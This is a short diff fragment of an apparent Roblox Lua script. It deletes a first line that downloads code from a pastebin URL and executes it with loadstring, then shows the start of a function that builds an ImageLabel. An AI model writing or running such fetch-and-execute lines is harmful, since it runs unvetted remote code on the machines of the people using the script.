@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/bf9DPYWp"))()
 local function ACBF(name, text, group, yy) 
 local Temp = Instance.new("ImageLabel") 
 Temp.Parent = Func
